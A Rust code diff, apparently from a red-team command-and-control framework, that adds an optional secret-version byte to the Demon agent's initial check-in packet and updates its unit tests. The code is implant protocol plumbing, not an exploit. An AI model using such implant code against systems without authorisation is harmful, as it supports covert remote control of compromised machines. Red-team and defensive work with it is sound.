@@ -83,20 +83,31 @@ pub struct TaskingResponse {
 }
 
 /// Build a `DEMON_INIT` packet matching the Demon transport framing.
+///
+/// When `init_secret_version` is [`Some`], a one-byte secret version is written
+/// after the cleartext AES key/IV and before the encrypted metadata.  This
+/// matches listeners configured with `InitSecrets = [...]` (versioned HKDF).
+/// When [`None`], the envelope matches the legacy single-`InitSecret` profile
+/// (no version byte).
 pub fn build_init_packet(
     agent_id: u32,
     crypto: &AgentCryptoMaterial,
     metadata: &AgentMetadata,
+    init_secret_version: Option<u8>,
 ) -> Result<Vec<u8>, PhantomError> {
     let plaintext = serialize_init_metadata(agent_id, metadata)?;
     let encrypted = encrypt_agent_data(&crypto.key, &crypto.iv, &plaintext)?;
 
-    let payload_len = 4 + 4 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH + encrypted.len();
+    let extra = usize::from(init_secret_version.is_some());
+    let payload_len = 4 + 4 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH + extra + encrypted.len();
     let mut payload = Vec::with_capacity(payload_len);
     payload.extend_from_slice(&u32::from(DemonCommand::DemonInit).to_be_bytes());
     payload.extend_from_slice(&0_u32.to_be_bytes());
     payload.extend_from_slice(&crypto.key);
     payload.extend_from_slice(&crypto.iv);
+    if let Some(version) = init_secret_version {
+        payload.push(version);
+    }
     payload.extend_from_slice(&encrypted);
 
     let envelope = DemonEnvelope::new(agent_id, payload)?;
@@ -415,7 +426,7 @@ mod tests {
     #[test]
     fn init_packet_uses_demon_header() {
         let crypto = generate_agent_crypto_material().expect("crypto");
-        let packet = build_init_packet(0x4142_4344, &crypto, &metadata()).expect("packet");
+        let packet = build_init_packet(0x4142_4344, &crypto, &metadata(), None).expect("packet");
         assert_eq!(&packet[4..8], &DEMON_MAGIC_VALUE.to_be_bytes());
         assert_eq!(&packet[8..12], &0x4142_4344_u32.to_be_bytes());
     }
@@ -424,7 +435,7 @@ mod tests {
     fn init_packet_contains_monotonic_ctr_and_seq_protected_flags() {
         let crypto = generate_agent_crypto_material().expect("crypto");
         let agent_id = 0x4142_4344_u32;
-        let packet = build_init_packet(agent_id, &crypto, &metadata()).expect("packet");
+        let packet = build_init_packet(agent_id, &crypto, &metadata(), None).expect("packet");
         let envelope = red_cell_common::demon::DemonEnvelope::from_bytes(&packet).expect("env");
 
         // Skip: command_id(4) + padding(4) + key(32) + iv(16) = 56 bytes of cleartext header.
@@ -443,6 +454,27 @@ mod tests {
             ext_flags & super::INIT_EXT_SEQ_PROTECTED,
             0,
             "init packet must include INIT_EXT_SEQ_PROTECTED extension flag"
+        );
+    }
+
+    #[test]
+    fn init_packet_versioned_inserts_secret_version_before_ciphertext() {
+        let crypto = generate_agent_crypto_material().expect("crypto");
+        let agent_id = 0x1122_3344_u32;
+        let version = 7_u8;
+        let packet = build_init_packet(agent_id, &crypto, &metadata(), Some(version)).expect("packet");
+        let envelope = red_cell_common::demon::DemonEnvelope::from_bytes(&packet).expect("env");
+        // command_id(4) + request_id(4) + key(32) + iv(16) = 56; then version byte.
+        assert!(
+            envelope.payload.len() > 57,
+            "versioned init payload must extend past version byte"
+        );
+        assert_eq!(envelope.payload[56], version);
+        let encrypted = &envelope.payload[57..];
+        let plaintext = decrypt_agent_data(&crypto.key, &crypto.iv, encrypted).expect("decrypt");
+        assert!(
+            plaintext.len() >= 4,
+            "decrypted metadata should include agent_id prefix"
         );
     }
 
